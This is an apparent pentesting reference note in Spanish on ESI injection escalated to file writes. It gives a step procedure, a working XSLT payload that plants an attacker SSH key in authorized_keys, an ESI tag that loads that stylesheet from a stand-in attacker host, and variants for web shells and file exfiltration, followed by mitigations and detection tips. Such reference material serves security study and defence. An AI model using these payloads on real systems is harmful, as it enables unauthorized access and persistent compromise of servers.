---
title: ESI injection — de una etiqueta a escritura de archivos
tags: [web, esi, xslt, file-write, rce]
---

# ESI injection — de una etiqueta a escritura de archivos

[🇬🇧 English](esi-injection-file-write.en.md) | **Español**

## Concepto

Edge Side Includes (ESI) permite componer respuestas en el proxy/cache. Si la aplicación procesa etiquetas del usuario y acepta un `stylesheet` XSLT, se puede cargar una hoja remota que escriba archivos con `xsl:result-document` oextensiones del procesador. En un host con SSH, escribir `authorized_keys` es ejecución.

## Cuándo aplica

- La aplicación refleja mensajes, comentarios o tickets y el proxy tiene ESI activo.
- El parámetro `stylesheet` o `src` no está restringido.
- El proceso puede escribir en el home de un usuario o en una ruta servida.

## Procedimiento

1. Confirmar el procesamiento con `<esi:include src="http://localhost/"/>`.
2. Alojar una hoja XSLT que use `xsl:result-document`.
3. Apuntar a `/home/<user>/.ssh/authorized_keys`.
4. Conectar por SSH con la clave correspondiente.

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="/home/sam/.ssh/authorized_keys">
      <xsl:text>ssh-ed25519 AAAA... attacker</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

```text
<esi:include src="http://localhost/" stylesheet="http://<ATTACKER>/write.xsl"></esi:include>
```

## Variantes

- Escribir un `.php` o `.jsp` en el document root.
- Usar `document()` para leer archivos y exfiltrarlos.
- Si el proxy cachea, envenenar la respuesta para otros usuarios.

## Limitaciones

- El procesador XSLT debe permitir `result-document` y escritura.
- La ruta debe ser escribible por el usuario del proxy.
- ESI puede estar limitado a orígenes de confianza.

## Mitigación y detección

- Deshabilitar ESI o validar etiquetas y orígenes.
- No permitir `stylesheet` controlado por el usuario.
- Ejecutar el proxy con un usuario sin acceso a homes.
- Monitorizar escrituras en `.ssh` y archivos nuevos en el document root.

## Referencias

- <https://www.w3.org/TR/esi-lang/>
- <https://www.w3.org/TR/xslt-30/>
- <https://book.hacktricks.wiki/en/pentesting-web/esi-injection.html>
